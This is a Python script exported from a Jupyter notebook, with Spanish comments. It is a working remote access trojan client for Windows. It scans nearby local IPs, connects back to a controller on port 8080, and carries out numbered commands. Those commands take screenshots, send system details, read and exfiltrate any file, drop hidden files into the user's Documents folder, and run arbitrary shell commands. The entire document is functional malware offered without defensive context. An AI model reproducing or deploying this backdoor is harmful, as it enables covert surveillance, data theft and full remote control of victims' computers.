#!/usr/bin/env python
# coding: utf-8

# In[1]:


import socket as soc
import win32api,win32con,os
import platform as plt
import  subprocess as  sub
import mss,base64



def recepcion_comand(cliente):
    ack='Esperando comandos...'
    cliente.send(ack.encode())
    while True:
        comando=''
        comando=cliente.recv(1024)
        if comando.decode()== '1':
                try:
                    # Enviar directorio actual
                    directorio_actual=os.getcwd()
                    cliente.send(str(directorio_actual).encode())
                except:
                    valor='Error en el comando_1'
                    cliente.send(valor.encode())
                
        elif comando.decode()=='2':
                try:
                    screen_show=mss.mss()
                    screen_show.shot()
                    with open('monitor-1.png','rb') as fname:
                        cliente.send(base64.b64encode(fname.read()))
                    fname.close()
                    os.remove('monitor-1.png')
                except:
                    valor='Fallo'
                    cliente.send(valor.encode())
                
       
        elif comando.decode()=='3':
                cliente.close()
                break
        
        elif comando.decode()=='4':
                cliente.send(str(plt.uname()).encode())
            
        elif comando.decode()=='5':
                cliente.send(b'OK')
                comando=cliente.recv(1024)
                direccion=comando.decode()
                with  open(direccion,'rb') as  fname:
                    cliente.send(base64.b64encode(fname.read()))
                fname.close()
                
        elif comando.decode()=='6':
                cliente.send(b'OK')
                comando=cliente.recv(1024)
                nombre=comando.decode()
                ruta='C:/Users/'+os.getlogin()+'/Documents/'+nombre
                with open(ruta,'wb') as fname:
                   comando=cliente.recv(1000000)
                   datos=base64.b64decode(comando)
                   fname.write(datos)
                fname.close()
                win32api.SetFileAttributes(ruta,win32con.FILE_ATTRIBUTE_HIDDEN)
                   
                
        elif comando.decode()=='7':
               cliente.send(b'OK')
               comando=cliente.recv(1024)
               if comando.decode()=='cd..':
                    os.chdir('..')
                    directorio_actual=os.getcwd()
                    cliente.send(str(directorio_actual).encode())
               elif comando.decode()[:2]=='cd':
                   direccion=comando.decode()[3:]
                   os.chdir(direccion)
                   directorio_actual=os.getcwd()
                   cliente.send(str(directorio_actual).encode())
               else:
                   cmd=sub.Popen(comando.decode(),stdout=sub.PIPE,stderr=sub.PIPE,stdin=sub.PIPE,shell=True)
                   salida=cmd.stdout.read()+cmd.stderr.read()
                   cliente.send(salida)     
    return 0


def ip_server(ip):
    punto=ip.find('.',8)
    ipx=ip[:punto]+'.'
    lista_ip=[]
    for rango in range(1,7):
        respuesta=os.popen('ping '+ipx+str(rango))
        for linea in respuesta.readlines():
            if ('ttl' in linea.lower()):
                lista_ip.append(ipx+str(rango))
    return lista_ip
    
    

def Main():
    global client
    puerto=8080
    ip=soc.gethostbyname(soc.gethostname())
    while True:
        ip_obj=ip_server(ip)
        for ip_targed in ip_obj:
            try:
                client=soc.socket(soc.AF_INET,soc.SOCK_STREAM)
                client.setsockopt(soc.SOL_SOCKET,soc.SO_REUSEADDR,1)
                client.connect((ip_targed,puerto))
                recepcion_comand(client)
            except OSError:
                 continue
            
           
            
    

if __name__=='__main__':
    Main()


# In[ ]:




